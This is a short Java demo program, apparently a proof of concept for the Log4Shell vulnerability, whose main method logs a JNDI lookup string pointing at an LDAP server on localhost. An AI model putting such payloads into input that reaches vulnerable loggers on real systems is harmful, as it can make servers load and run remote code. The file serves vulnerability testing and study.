package io.github.junlapong;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class App {

	private static final Logger logger = LogManager.getLogger(App.class);

	public static void main(String[] args) {
		logger.info("Hello log2shell: {}", "${jndi:ldap://127.0.0.1/exploit}");

		ClassUseSlf4j.printLog();
	}
}
